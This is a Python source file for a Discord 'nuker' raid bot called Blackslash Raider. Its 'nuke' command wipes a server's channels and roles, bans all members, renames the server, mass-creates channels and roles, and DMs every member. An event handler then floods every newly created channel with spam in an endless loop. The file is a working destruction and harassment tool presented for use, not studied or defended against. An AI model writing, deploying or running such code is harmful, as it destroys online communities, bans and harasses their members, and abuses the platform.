
import discord
from discord.ext import commands
import random
import json
import os
import BS_Nuker

with open("config.json", "r") as jsonfile:
    config = json.load(jsonfile) # Reading the file
    jsonfile.close()
BS_Nuker.set_config(config)
if config['token'] == "env":
  #replit enviroment
  token = os.environ['TOKEN']
else:
 token = config['token']
client = commands.Bot(command_prefix=config['PREFIX'])
client.remove_command('help')
@client.event
async def on_ready():
   await client.change_presence(activity=discord.Game(name="Blackslash Raider"))
   BS_Nuker.helpers.help_msg()
  
@client.command()
async def help(ctx):
  await BS_Nuker.helpers.help(ctx)



@client.command()
async def nuke(ctx):
  Nuker = BS_Nuker.Raider
  guild = ctx.guild
  await Nuker.DeleteChannels(guild)
  await Nuker.BanMembers(guild)
  await Nuker.DeleteRoles(guild)
  await Nuker.ChangeName(guild)
  await Nuker.ChangeIcon(guild)
  await Nuker.CheateInvites(guild)
  await Nuker.CreateRoles(guild)
  await Nuker.CreateChannels(guild, 50)
  await Nuker.DMAll(guild)
  

@client.event
async def on_guild_channel_create(channel):
  while True:
    await channel.send(random.choice(config['SPAM_MESSAGE']))



client.run(token, bot=True)
